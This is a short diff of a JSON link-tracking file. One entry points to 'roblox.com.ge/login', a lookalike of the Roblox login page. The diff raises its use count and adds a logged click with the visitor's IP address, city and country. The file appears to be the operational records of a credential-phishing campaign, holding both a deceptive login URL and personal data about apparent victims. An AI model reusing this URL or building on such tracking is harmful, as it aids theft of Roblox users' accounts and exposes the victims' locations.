@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1413,
+    "useCount": 1414,
     "createdBy": "admin",
     "clicks": [
       {
@@ -11472,6 +11472,14 @@
         "city": "Ugong Norte",
         "flag": "🇵🇭",
         "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777428202295,
+        "ip": "187.249.84.82",
+        "country": "Mexico",
+        "city": "Allende",
+        "flag": "🇲🇽",
+        "countryCode": "MX"
       }
     ]
   },
